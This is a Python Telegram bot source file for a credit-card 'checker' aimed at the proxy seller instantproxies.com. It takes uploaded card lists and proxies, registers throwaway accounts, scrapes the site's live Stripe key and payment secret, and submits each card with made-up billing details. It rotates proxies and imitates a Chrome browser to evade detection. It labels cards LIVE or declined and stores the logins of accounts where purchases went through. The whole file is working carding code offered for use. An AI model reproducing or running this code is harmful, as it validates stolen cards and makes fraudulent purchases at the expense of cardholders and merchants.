#!/usr/bin/env python3
"""
InstantProxies Checker Bot — Fixed Proxy Issue
Made by @hey_berlin | Developer: @hey_berlin
Plans: RP_1 ($10) | RP_2 ($25) | RP_3 ($50)
"""

from __future__ import annotations

import asyncio
import concurrent.futures
import json
import os
import pickle
import random
import re
import string
import sys
import threading
import time
import traceback
import uuid
from dataclasses import dataclass
from datetime import datetime
from typing import Optional, List, Dict, Any, Set, Tuple
from urllib.parse import urlparse

from flask import Flask
from telegram import Update
from telegram.constants import ParseMode
from telegram.error import NetworkError, TimedOut
from telegram.ext import Application, ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
from telegram.request import HTTPXRequest
from curl_cffi import requests as curl_requests
from curl_cffi.requests.errors import RequestsError

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
PORT = int(os.environ.get("PORT", "8080"))
MAX_CONCURRENT_USERS = 50
PROXY_CHECK_WORKERS = 30

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!"); sys.exit(1)

health_app = Flask(__name__)
bot_ready = False
startup_time = datetime.now()

@health_app.route('/')
def home():
    return f"InstantProxies: 🟢 | {int((datetime.now()-startup_time).total_seconds())}s"

@health_app.route('/health')
def health():
    return "OK", 200

threading.Thread(target=lambda: health_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True), daemon=True).start()

PLANS = {
    "RP_1": {"name": "Residential Plan 1", "price": "$10", "bandwidth_options": ["1 GB", "5 GB", "10 GB", "25 GB"], "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_1", "plan_id": "RP_1"},
    "RP_2": {"name": "Residential Plan 2", "price": "$25", "bandwidth_options": ["5 GB", "10 GB", "25 GB", "50 GB"], "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_2", "plan_id": "RP_2"},
    "RP_3": {"name": "Residential Plan 3", "price": "$50", "bandwidth_options": ["10 GB", "25 GB", "50 GB", "100 GB"], "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_3", "plan_id": "RP_3"},
}

DEFAULT_PLAN = "RP_1"
DEFAULT_BANDWIDTH = "1 GB"

DEV_TG = "@hey\\_berlin"
IMPERSONATE = "chrome131"
SITE_BASE = "https://instantproxies.com"
SITE_API = "https://instantproxies.com/dashboard"
STRIPE_API = "https://api.stripe.com/v1"

HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
}

ADDRESSES_BY_COUNTRY = {
    "US": {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "postal_code": "62704", "country": "US"},
    "GB": {"line1": "221B Baker Street", "city": "London", "state": "England", "postal_code": "NW1 6XE", "country": "GB"},
    "CA": {"line1": "100 Queen Street West", "city": "Toronto", "state": "ON", "postal_code": "M5H 2N2", "country": "CA"},
    "IN": {"line1": "42 MG Road", "city": "Mumbai", "state": "Maharashtra", "postal_code": "400001", "country": "IN"},
}

RANDOM_NAMES = ["James Smith","Maria Garcia","Robert Johnson","Patricia Brown","John Williams"]

def generate_phone():
    area_codes = ["201","202","203","205","206","207","208","209","212","213","214","215","216","217","218","219","301","302","303","304","305","307","308","309","310","312","313","314","315","316","317","318","319"]
    return "+1" + random.choice(area_codes) + "".join(random.choices("0123456789", k=7))

def get_country_from_card(card_number: str) -> str:
    if card_number.startswith("4"): return "US"
    if card_number.startswith("5"): return "US"
    return "US"

DB_FILE = "instantproxies_db.pkl"

class Database:
    def __init__(self):
        self.users: Dict[int, Dict] = {}
        self.user_proxies: Dict[int, List[str]] = {}
        self.user_cards: Dict[int, List[str]] = {}
        self.user_plan: Dict[int, str] = {}
        self.user_bandwidth: Dict[int, str] = {}
        self.user_accounts: Dict[int, List[Dict]] = {}
        self.charged_accounts: List[Dict] = []
        self.load()

    def save(self):
        try:
            with open(DB_FILE, "wb") as f:
                pickle.dump({"users": self.users, "user_proxies": self.user_proxies, "user_cards": self.user_cards, "user_plan": self.user_plan, "user_bandwidth": self.user_bandwidth, "user_accounts": self.user_accounts, "charged_accounts": self.charged_accounts}, f)
        except Exception: pass

    def load(self):
        try:
            with open(DB_FILE, "rb") as f:
                data = pickle.load(f)
                for k in data:
                    if hasattr(self, k): setattr(self, k, data[k])
        except FileNotFoundError: self.save()
        except Exception: self.save()

    def get_user(self, uid: int) -> Dict:
        if uid not in self.users:
            self.users[uid] = {"id": uid, "joined": datetime.now().isoformat(), "total_checks": 0, "charged": 0, "approved": 0, "declined": 0}
        return self.users[uid]

    def add_charged(self, email: str, password: str, plan: str, bandwidth: str, card_masked: str, user_id: int):
        self.charged_accounts.append({"email": email, "password": password, "plan": plan, "bandwidth": bandwidth, "card": card_masked, "user_id": user_id, "site": "instantproxies.com", "time": datetime.now().isoformat()})
        self.save()

db = Database()

active_tasks: Dict[int, asyncio.Task] = {}
user_states: Dict[int, Dict] = {}

def get_user_state(uid: int) -> Dict:
    if uid not in user_states: user_states[uid] = {}
    return user_states[uid]

def check_single_proxy(proxy_url: str, timeout: int = 8) -> bool:
    try:
        s = curl_requests.Session(impersonate=IMPERSONATE)
        r = s.get(f"{SITE_BASE}/dashboard/checkout?plan=RP_1", proxy=proxy_url, timeout=timeout, headers=HEADERS)
        return r.status_code in (200, 201, 301, 302, 403, 404, 405)
    except Exception: return False

def filter_active_proxies(raw_proxies: List[str]) -> List[str]:
    if not raw_proxies: return []
    normalized = []
    seen = set()
    for raw in raw_proxies:
        line = raw.strip()
        if not line or line.startswith('#'): continue
        url = normalize_proxy(line)
        if url and url not in seen: seen.add(url); normalized.append(line)
    if not normalized: return []
    
    # Skip check if 5 or fewer proxies
    if len(normalized) <= 5:
        print(f"🛡️ Only {len(normalized)} proxies — using all")
        return normalized
    
    print(f"🛡️ Testing {len(normalized)} proxies...")
    active = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=PROXY_CHECK_WORKERS) as ex:
        futures = {ex.submit(check_single_proxy, normalize_proxy(r)): r for r in normalized}
        for f in concurrent.futures.as_completed(futures):
            try:
                if f.result(): active.append(futures[f])
            except Exception: pass
    
    # If all failed, return original list
    if not active and normalized:
        print(f"⚠️ All proxies failed — using all {len(normalized)} anyway")
        return normalized
    
    print(f"🛡️ {len(active)}/{len(normalized)} proxies active")
    return active

@dataclass
class ProxyEntry:
    raw: str; url: str

class ProxyPool:
    def __init__(self, e): self.entries = list(e); self._lock = threading.Lock()
    def __len__(self): return len(self.entries)
    def pick(self):
        with self._lock: return random.choice(self.entries) if self.entries else None
    def drop(self, e):
        with self._lock:
            for i, x in enumerate(self.entries):
                if x.url == e.url: self.entries.pop(i); return bool(self.entries)
        return bool(self.entries)

class InstantProxiesClient:
    def __init__(self, plan: str = DEFAULT_PLAN, bandwidth: str = DEFAULT_BANDWIDTH, email: Optional[str] = None, password: Optional[str] = None):
        self.session = curl_requests.Session(impersonate=IMPERSONATE)
        self.proxy_pool: Optional[ProxyPool] = None
        self.plan = PLANS.get(plan, PLANS[DEFAULT_PLAN])
        self.bandwidth = bandwidth
        self.email = email
        self.password = password
        self.cookies: Dict[str, str] = {}
        self.csrf_token = str(uuid.uuid4())
        self.stripe_pk: Optional[str] = None
        self.client_secret: Optional[str] = None
        self.payment_intent_id: Optional[str] = None

    def set_proxies(self, entries: list[ProxyEntry]):
        self.proxy_pool = ProxyPool(entries) if entries else None

    def _request(self, method: str, url: str, **kwargs):
        max_tries = max(len(self.proxy_pool or []), 1)
        last_exc = None
        for _ in range(max_tries):
            entry = self.proxy_pool.pick() if self.proxy_pool else None
            if entry: kwargs["proxy"] = entry.url
            try:
                kwargs.setdefault("headers", HEADERS.copy())
                kwargs.setdefault("timeout", 30)
                if self.cookies: kwargs.setdefault("cookies", self.cookies)
                return self.session.request(method, url, **kwargs)
            except Exception as exc:
                last_exc = exc
                if self._is_proxy_err(exc) and entry and self.proxy_pool:
                    self.proxy_pool.drop(entry); continue
                raise
        raise last_exc if last_exc else RuntimeError("No proxies left")

    def _is_proxy_err(self, exc) -> bool:
        return isinstance(exc, RequestsError) or any(x in str(exc).lower() for x in ("proxy","connect","refused","timed out"))

    def setup_account(self) -> bool:
        if self.email and self.password: return self._login()
        return self._create_account()

    def _create_account(self) -> bool:
        rid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        self.email = f"user_{rid}@gmail.com"
        self.password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$", k=16))
        try:
            resp = self._request("GET", f"{SITE_BASE}/dashboard/register")
            for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
            match = re.search(r'name=["\']_token["\']\s*value=["\']([^"\']+)["\']', resp.text)
            if match: self.csrf_token = match.group(1)
            payload = {"name": f"User {rid[:6]}", "email": self.email, "password": self.password, "password_confirmation": self.password, "_token": self.csrf_token}
            resp = self._request("POST", f"{SITE_BASE}/dashboard/register", data=payload, headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
            for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
            return True
        except Exception: pass
        return True

    def _login(self) -> bool:
        try:
            resp = self._request("GET", f"{SITE_BASE}/dashboard/login")
            for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
            match = re.search(r'name=["\']_token["\']\s*value=["\']([^"\']+)["\']', resp.text)
            if match: self.csrf_token = match.group(1)
            payload = {"email": self.email, "password": self.password, "_token": self.csrf_token}
            resp = self._request("POST", f"{SITE_BASE}/dashboard/login", data=payload, headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
            for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
            return True
        except Exception: pass
        return True

    def extract_stripe_info(self) -> bool:
        try:
            resp = self._request("GET", self.plan["checkout_url"])
            html = resp.text
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
            if pk_match: self.stripe_pk = pk_match.group(0)
            cs_match = re.search(r'client_secret["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
            if cs_match: self.client_secret = cs_match.group(1)
            if self.client_secret and "_secret_" in self.client_secret: self.payment_intent_id = self.client_secret.split("_secret_")[0]
            token_match = re.search(r'name=["\']_token["\']\s*value=["\']([^"\']+)["\']', html)
            if token_match: self.csrf_token = token_match.group(1)
            for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
            return True
        except Exception: return False

    def attempt_payment(self, card: dict) -> Tuple[str, str, bool]:
        card_number = re.sub(r"\D", "", card["number"])
        exp_month = str(int(card["exp_month"])).zfill(2)
        exp_year = card["exp_year"]; cvc = card["cvc"]
        country = get_country_from_card(card_number)
        addr = ADDRESSES_BY_COUNTRY.get(country, ADDRESSES_BY_COUNTRY["US"])
        name = random.choice(RANDOM_NAMES); phone = generate_phone()
        
        pm_payload = {
            "type": "card",
            "card[number]": card_number, "card[exp_month]": exp_month, "card[exp_year]": exp_year, "card[cvc]": cvc,
            "billing_details[name]": name, "billing_details[phone]": phone,
            "billing_details[address][line1]": addr["line1"], "billing_details[address][city]": addr["city"],
            "billing_details[address][state]": addr["state"], "billing_details[address][postal_code]": addr["postal_code"],
            "billing_details[address][country]": addr["country"],
        }
        if self.stripe_pk: pm_payload["key"] = self.stripe_pk
        
        try:
            resp = self._request("POST", f"{STRIPE_API}/payment_methods", data=pm_payload,
                headers={**HEADERS, "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": SITE_BASE})
            pm_data = resp.json() if resp.text else {}; pm_id = pm_data.get("id", "")
            
            if not pm_id:
                err = pm_data.get("error", {}); em = err.get("message", str(err)) if isinstance(err, dict) else str(err); eml = em.lower()
                if any(x in eml for x in ("insufficient","funds","balance")): return ("APPROVED", "LIVE - Insufficient funds", False)
                if any(x in eml for x in ("cvc","security","incorrect","invalid")): return ("APPROVED", "LIVE - Verification error", False)
                if any(x in eml for x in ("declined","rejected","blocked","stolen","fraud")): return ("DECLINED", em[:40], False)
                return ("DECLINED", em[:40], False)
            
            if self.client_secret and self.payment_intent_id:
                confirm_payload = {"payment_method": pm_id, "use_stripe_sdk": "true"}
                if self.stripe_pk: confirm_payload["key"] = self.stripe_pk
                resp = self._request("POST", f"{STRIPE_API}/payment_intents/{self.payment_intent_id}/confirm", data=confirm_payload,
                    headers={**HEADERS, "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": SITE_BASE})
                pi_data = resp.json() if resp.text else {}; pi_status = pi_data.get("status", "")
                
                if pi_status == "succeeded":
                    if self._verify_purchase(): return ("CHARGED", f"✅ VERIFIED {self.plan['name']} ({self.bandwidth})", True)
                    return ("APPROVED", "Payment OK, verifying...", False)
                if pi_status == "requires_action": return ("APPROVED", "3DS Required", False)
                if pi_status == "requires_payment_method": return ("DECLINED", "Card rejected", False)
                
                err = pi_data.get("error", {}) or pi_data.get("last_payment_error", {})
                em = err.get("message", str(err)) if isinstance(err, dict) else str(err); eml = em.lower()
                if any(x in eml for x in ("insufficient","funds","balance")): return ("APPROVED", "LIVE - Insufficient funds", False)
                if any(x in eml for x in ("declined","rejected","blocked")): return ("DECLINED", em[:40], False)
                return ("APPROVED", "Card accepted", False)
            
            return self._site_checkout_fallback(card, pm_id, addr, name, phone)
        except Exception as e:
            em = str(e)
            if "insufficient" in em.lower(): return ("APPROVED", "LIVE", False)
            if "declined" in em.lower(): return ("DECLINED", em[:40], False)
            return ("ERROR", em[:80], False)

    def _site_checkout_fallback(self, card: dict, pm_id: str, addr: dict, name: str, phone: str) -> Tuple[str, str, bool]:
        card_number = re.sub(r"\D", "", card["number"])
        payload = {"_token": self.csrf_token, "plan": self.plan["plan_id"], "bandwidth": self.bandwidth, "payment_method": pm_id,
            "card_number": card_number, "card_expiry": f"{card['exp_month']}/{card['exp_year']}", "card_cvc": card["cvc"],
            "name": name, "phone": phone, "address": addr["line1"], "city": addr["city"], "state": addr["state"],
            "zip": addr["postal_code"], "country": addr["country"]}
        try:
            resp = self._request("POST", f"{SITE_API}/checkout/process", data=payload, headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
            if resp.status_code in (200, 201, 302):
                if any(x in resp.text.lower() for x in ("success","thank","order","complete")):
                    if self._verify_purchase(): return ("CHARGED", f"✅ VERIFIED {self.plan['name']}", True)
                    return ("APPROVED", "Order placed, verifying...", False)
                return ("APPROVED", "Payment processed", False)
            return ("DECLINED", f"HTTP {resp.status_code}", False)
        except Exception as e: return ("ERROR", str(e)[:80], False)

    def _verify_purchase(self) -> bool:
        try:
            resp = self._request("GET", f"{SITE_API}/orders")
            if resp.status_code == 200:
                html = resp.text.lower()
                if any(x in html for x in ("order confirmed","order completed","active","proxy list","my proxies","download")): return True
        except Exception: pass
        return False

    def run_full_check(self, card: dict) -> Tuple[str, str]:
        if not self.setup_account(): return ("ERROR", "Account setup failed")
        if not self.extract_stripe_info(): return ("ERROR", "Failed to load checkout")
        status, msg, verified = self.attempt_payment(card)
        if status == "CHARGED" and verified: return ("CHARGED", f"🔥 {self.plan['name']} ({self.bandwidth}) VERIFIED ✅")
        if status == "APPROVED": return ("APPROVED", f"LIVE | {msg}")
        if status == "DECLINED": return ("DECLINED", msg)
        return ("ERROR", msg)

def normalize_proxy(raw: str) -> str:
    line = raw.strip()
    if not line: return ""
    if line.startswith(("http://","https://","socks5://","socks5h://")): return line
    if "@" in line and "://" not in line: return f"http://{line}"
    p = line.split(":")
    if len(p)==2: return f"http://{p[0]}:{p[1]}"
    if len(p)>=4: return f"http://{p[2]}:{':'.join(p[3:])}@{p[0]}:{p[1]}"
    return f"http://{line}"

def parse_card(raw: str) -> Optional[dict]:
    t = raw.strip().replace(" ","")
    if "|" not in t: return None
    p = t.split("|")
    if len(p)<4: return None
    n = re.sub(r"\D","",p[0])
    if len(n)<13: return None
    return {"number":n,"exp_month":p[1],"exp_year":p[2],"cvc":p[3]}

# ============================================
# BOT HANDLERS
# ============================================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; db.get_user(uid)
    plan = db.user_plan.get(uid, DEFAULT_PLAN); bw = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
    await update.message.reply_text(
        f"🛡️ *InstantProxies Checker*\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👨‍💻 Made by @hey\\_berlin\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📋 *Current:* {PLANS[plan]['name']} | {bw}\n\n"
        f"*Setup:*\n/plan — Select plan\n/bandwidth — Select bandwidth\n"
        f"/proxies — Upload proxy list\n/cards — Upload cc.txt\n"
        f"/addacc email:pass — Add account\n/run — Start\n\n"
        f"📊 /status | 🔥 /charged | 🛑 /cancel\n✅ *100% Verified*",
        parse_mode=ParseMode.MARKDOWN
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"📋 *Commands*\n/plan — RP_1/RP_2/RP_3\n/bandwidth — Select\n/proxies — Upload\n/cards — Upload\n/addacc — Add account\n/run — Start\n/status — Stats\n/charged — Purchases\n/cancel — Stop", parse_mode=ParseMode.MARKDOWN)

async def cmd_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        current = db.user_plan.get(uid, DEFAULT_PLAN)
        txt = f"📋 *Select Plan*\nCurrent: {PLANS[current]['name']} ({PLANS[current]['price']})\n\n"
        for k, v in PLANS.items(): txt += f"/plan {k} — {v['name']} ({v['price']})\n"
        await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN); return
    choice = context.args[0].upper()
    if choice in PLANS: db.user_plan[uid] = choice; db.save(); await update.message.reply_text(f"✅ {PLANS[choice]['name']}", parse_mode=ParseMode.MARKDOWN)
    else: await update.message.reply_text("❌ RP_1, RP_2, RP_3")

async def cmd_bandwidth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; plan_key = db.user_plan.get(uid, DEFAULT_PLAN); plan = PLANS[plan_key]
    if not context.args:
        current = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
        txt = f"📶 *Bandwidth*\n{plan['name']}\nCurrent: {current}\n\n"
        for bw in plan["bandwidth_options"]: txt += f"/bandwidth {bw}\n"
        await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN); return
    choice = context.args[0]
    if choice in plan["bandwidth_options"]: db.user_bandwidth[uid] = choice; db.save(); await update.message.reply_text(f"✅ {choice}", parse_mode=ParseMode.MARKDOWN)
    else: await update.message.reply_text(f"❌ Options: {', '.join(plan['bandwidth_options'])}")

async def cmd_addacc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args: await update.message.reply_text("📧 `/addacc email:pass`", parse_mode=ParseMode.MARKDOWN); return
    try:
        acc_str = context.args[0]
        if ":" in acc_str:
            email, password = acc_str.split(":", 1)
            if uid not in db.user_accounts: db.user_accounts[uid] = []
            db.user_accounts[uid].append({"email": email.strip(), "password": password.strip()}); db.save()
            await update.message.reply_text(f"✅ `{email}` | Total: {len(db.user_accounts[uid])}", parse_mode=ParseMode.MARKDOWN)
    except Exception: await update.message.reply_text("❌ `/addacc email:pass`")

async def cmd_myaccs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; accounts = db.user_accounts.get(uid, [])
    if not accounts: await update.message.reply_text("❌ None. /addacc"); return
    text = f"📧 *Accounts*\n"
    for i, a in enumerate(accounts, 1): text += f"{i}. `{a['email']}`\n"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_charged(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; charged = [a for a in db.charged_accounts if a["user_id"] == uid]
    if not charged: await update.message.reply_text("❌ No purchases yet. /run"); return
    text = f"🔥 *REAL Purchases (Verified)*\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, a in enumerate(charged[-15:], 1):
        text += f"{i}. 📧 `{a['email']}`\n   🔑 `{a['password']}`\n   📋 {a['plan']} | {a['bandwidth']}\n   🌐 {a['site']}\n\n"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    get_user_state(update.effective_user.id)["awaiting"] = "proxies"
    await update.message.reply_text("🛡️ Send proxies (ip:port) or .txt file.", parse_mode=ParseMode.MARKDOWN)

async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    get_user_state(update.effective_user.id)["awaiting"] = "cards"
    await update.message.reply_text("💳 Send cards (card|mm|yy|cvv) or .txt file.", parse_mode=ParseMode.MARKDOWN)

async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; st = get_user_state(uid)
    if uid in active_tasks and not active_tasks[uid].done(): await update.message.reply_text("⚠️ Running."); return
    
    px = db.user_proxies.get(uid, []); cd = db.user_cards.get(uid, [])
    if not px: await update.message.reply_text("❌ No proxies! Use /proxies."); return
    if not cd: await update.message.reply_text("❌ No cards! Use /cards."); return
    
    cards = [(l.strip(), p) for l in cd if (p := parse_card(l))]
    if not cards: await update.message.reply_text("❌ No valid cards. Format: card|mm|yy|cvv"); return
    
    plan = db.user_plan.get(uid, DEFAULT_PLAN); bw = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
    acc = db.user_accounts.get(uid, [])
    mode = f"📧 {len(acc)} accounts" if acc else "🤖 Auto-creating"
    
    msg = await update.message.reply_text(f"🛡️ Processing {len(px)} proxies...\n📋 {PLANS[plan]['name']} | {bw}\n{mode}", parse_mode=ParseMode.MARKDOWN)
    
    loop = asyncio.get_event_loop()
    active = await loop.run_in_executor(None, filter_active_proxies, px)
    
    # FIX: Fallback to all proxies if check fails
    if not active and px:
        await msg.edit_text(f"⚠️ Proxy check failed. Using all {len(px)} proxies...", parse_mode=ParseMode.MARKDOWN)
        active = px
    elif not active:
        await msg.edit_text("❌ No proxies loaded! Use /proxies to upload."); return
    
    entries = []; seen = set()
    for raw in active:
        url = normalize_proxy(raw)
        if url and url not in seen: seen.add(url); entries.append(ProxyEntry(raw=raw, url=url))
    
    await msg.edit_text(f"✅ {len(entries)} proxies | 🚀 {len(cards)} cards\n📋 {PLANS[plan]['name']} ({PLANS[plan]['price']}) | {bw}\n🔍 100% Verified", parse_mode=ParseMode.MARKDOWN)
    st["cards"]=cards; st["chat_id"]=update.effective_chat.id; st["proxy_entries"]=entries; st["accounts"]=acc
    st["plan"]=plan; st["bandwidth"]=bw
    active_tasks[uid] = asyncio.create_task(_run_mass_check(update, context, uid, st))

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; u = db.get_user(uid)
    running = uid in active_tasks and not active_tasks[uid].done()
    charged_count = len([a for a in db.charged_accounts if a["user_id"] == uid])
    plan = db.user_plan.get(uid, DEFAULT_PLAN); bw = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
    await update.message.reply_text(
        f"📊 *Status*\n🛡️ {len(db.user_proxies.get(uid,[]))} proxies\n💳 {len(db.user_cards.get(uid,[]))} cards\n"
        f"📋 {PLANS[plan]['name']} | {bw}\n🔄 {'✅' if running else '❌'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n🔥 Purchases: {charged_count}\n"
        f"🟢 {u.get('charged',0)} | 🟡 {u.get('approved',0)} | 🔴 {u.get('declined',0)}\n\n🔍 100% Verified",
        parse_mode=ParseMode.MARKDOWN
    )

async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in active_tasks and not active_tasks[uid].done(): active_tasks[uid].cancel()
    await update.message.reply_text("🛑 Cancelled.")

async def handle_text_and_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; st = get_user_state(uid); aw = st.get("awaiting","")
    if aw == "proxies":
        text = await _get_text(update)
        if text:
            px = [l.strip() for l in text.split('\n') if l.strip() and not l.strip().startswith('#')]
            if px: db.user_proxies[uid]=px; db.save(); st.pop("awaiting",None); await update.message.reply_text(f"✅ *{len(px)} proxies saved!*\nNext: /cards", parse_mode=ParseMode.MARKDOWN)
            else: await update.message.reply_text("❌ No valid proxies found.")
    elif aw == "cards":
        text = await _get_text(update)
        if text:
            cards = [l.strip() for l in text.split('\n') if l.strip() and not l.strip().startswith('#')]
            v = sum(1 for c in cards if parse_card(c))
            db.user_cards[uid]=cards; db.save(); st.pop("awaiting",None)
            await update.message.reply_text(f"✅ {len(cards)} lines, {v} valid.\nNext: /run", parse_mode=ParseMode.MARKDOWN)

async def _get_text(update: Update) -> str:
    if update.message.document:
        f = await update.message.document.get_file(); c = await f.download_as_bytearray()
        return c.decode('utf-8',errors='ignore')
    return update.message.text or ""

async def _run_mass_check(update, context, uid: int, st: Dict):
    cards=st.get("cards",[]); chat_id=st.get("chat_id"); entries=st.get("proxy_entries",[])
    accounts=st.get("accounts",[]); plan=st.get("plan",DEFAULT_PLAN); bw=st.get("bandwidth",DEFAULT_BANDWIDTH)
    total=len(cards); ch=ap=de=er=0; ai=0
    plan_info = PLANS[plan]
    msg = await context.bot.send_message(chat_id, f"🔍 *0/{total}* | {plan_info['name']}\n🟢0 🟡0 🔴0", parse_mode=ParseMode.MARKDOWN)
    
    for i, (_, card) in enumerate(cards, 1):
        if uid in active_tasks and active_tasks[uid].cancelled(): await msg.edit_text(f"🛑 {i-1}/{total}"); return
        await asyncio.sleep(0)
        if i%2==0:
            try: await msg.edit_text(f"🔍 *{i}/{total}*\n💳 `{card['number'][:6]}...{card['number'][-4:]}`\n🟢{ch} 🟡{ap} 🔴{de}", parse_mode=ParseMode.MARKDOWN)
            except Exception: pass
        
        email=password=None
        if accounts: acc=accounts[ai%len(accounts)]; email,password=acc["email"],acc["password"]; ai+=1
        
        status="ERROR"; msg_text=""
        try:
            client=InstantProxiesClient(plan=plan,bandwidth=bw,email=email,password=password); client.set_proxies(entries)
            status, msg_text = client.run_full_check(card)
            if status=="CHARGED":
                cm=f"{card['number'][:6]}...{card['number'][-4:]}"; ch+=1
                db.add_charged(client.email,client.password,plan_info['name'],bw,cm,uid)
                email,password=client.email,client.password
            elif status=="APPROVED": ap+=1
            elif status=="DECLINED": de+=1
            else: er+=1
        except asyncio.CancelledError: await msg.edit_text("🛑"); return
        except Exception as e: er+=1; msg_text=str(e)[:80]
        
        emoji={"CHARGED":"🟢","APPROVED":"🟡","DECLINED":"🔴"}.get(status,"⚠️")
        rl=f"{emoji} `{card['number'][:6]}...{card['number'][-4:]}` — {msg_text}"
        if email and status=="CHARGED": rl+=f"\n📧 `{email}` | 🔑 `{password}`\n🌐 instantproxies.com | {plan_info['name']} | {bw}\n✅ VERIFIED"
        try: await context.bot.send_message(chat_id, rl, parse_mode=ParseMode.MARKDOWN)
        except Exception: pass
        
        u=db.get_user(uid); u["total_checks"]+=1
        if status=="CHARGED": u["charged"]+=1
        elif status=="APPROVED": u["approved"]+=1
        elif status=="DECLINED": u["declined"]+=1
        db.save()
        await asyncio.sleep(random.uniform(0.15,0.4))
    
    if uid in active_tasks: del active_tasks[uid]
    await context.bot.send_message(chat_id, f"✅ *Done!*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 {total}\n🔥 Purchased: {ch}\n🟡 Approved: {ap}\n🔴 Declined: {de}\n⚠️ Errors: {er}\n━━━━━━━━━━━━━━━━━━━━━━\n🔍 100% Verified\n/charged — View accounts\n👨‍💻 Made by @hey\\_berlin", parse_mode=ParseMode.MARKDOWN)

def main():
    global bot_ready
    print("="*60)
    print(f"🛡️ InstantProxies Checker | @hey_berlin")
    print(f"📋 RP_1 ($10) | RP_2 ($25) | RP_3 ($50)")
    print("="*60)
    
    try:
        req = HTTPXRequest(connection_pool_size=16, connect_timeout=30.0, read_timeout=30.0, write_timeout=30.0)
        app = ApplicationBuilder().token(BOT_TOKEN).request(req).concurrent_updates(True).build()
    except Exception:
        app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    
    for cmd, h in [("start",cmd_start),("help",cmd_help),("plan",cmd_plan),("bandwidth",cmd_bandwidth),("addacc",cmd_addacc),("myaccs",cmd_myaccs),("charged",cmd_charged),("proxies",cmd_proxies),("cards",cmd_cards),("run",cmd_run),("status",cmd_status),("cancel",cmd_cancel)]:
        app.add_handler(CommandHandler(cmd, h))
    app.add_handler(MessageHandler(filters.Document.ALL | (filters.TEXT & ~filters.COMMAND), handle_text_and_docs))
    
    bot_ready=True; print("✅ Bot READY")
    while True:
        try: app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True, close_loop=False)
        except (NetworkError, TimedOut) as e: print(f"⚠️ {e}"); time.sleep(10)
        except Exception as e: print(f"❌ {traceback.format_exc()}"); time.sleep(15)

if __name__ == "__main__":
    main()
